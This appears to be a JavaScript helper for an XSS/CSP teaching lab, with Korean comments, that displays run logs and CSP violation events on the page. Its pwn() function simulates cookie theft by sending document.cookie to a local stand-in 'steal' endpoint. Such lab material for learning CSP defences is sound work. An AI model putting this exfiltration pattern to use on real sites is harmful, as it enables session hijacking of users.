// 랩 화면용 도우미. 실행 로그와 CSP 위반 이벤트를 페이지에 보여 준다.
(() => {
  const entries = [];
  const violations = [];
  const icon = { ok: "✅", fail: "⛔", pwn: "💀" };

  const render = () => {
    const logList = document.getElementById("lab-log");
    const violationList = document.getElementById("lab-violations");
    if (logList) {
      logList.replaceChildren(
        ...entries.map(({ kind, message }) => {
          const item = document.createElement("li");
          item.className = kind;
          item.textContent = `${icon[kind]} ${message}`;
          return item;
        }),
      );
    }
    if (violationList) {
      violationList.replaceChildren(
        ...violations.map((violation) => {
          const item = document.createElement("li");
          item.className = violation.disposition === "report" ? "report" : "fail";
          item.textContent = `[${violation.disposition}] ${violation.effectiveDirective} ← ${violation.blockedURI || "(inline)"}${violation.sample ? ` · "${violation.sample}"` : ""}`;
          return item;
        }),
      );
    }
  };

  window.lab = {
    log(kind, message) {
      entries.push({ kind, message });
      render();
    },
    // 공격자가 실제로 할 일을 한 줄로 줄여 둔 것: 쿠키를 공격자 서버로 보낸다.
    pwn(via) {
      fetch(
        `http://localhost:4000/steal?via=${encodeURIComponent(via)}&c=${encodeURIComponent(document.cookie)}`,
        { mode: "no-cors" },
      ).catch(() => {});
      this.log("pwn", `공격 코드 실행됨 (${via}) → document.cookie 전송`);
    },
  };

  document.addEventListener("securitypolicyviolation", (event) => {
    violations.push({
      disposition: event.disposition,
      effectiveDirective: event.effectiveDirective,
      blockedURI: event.blockedURI,
      sample: event.sample,
    });
    render();
  });
  document.addEventListener("DOMContentLoaded", render);
})();
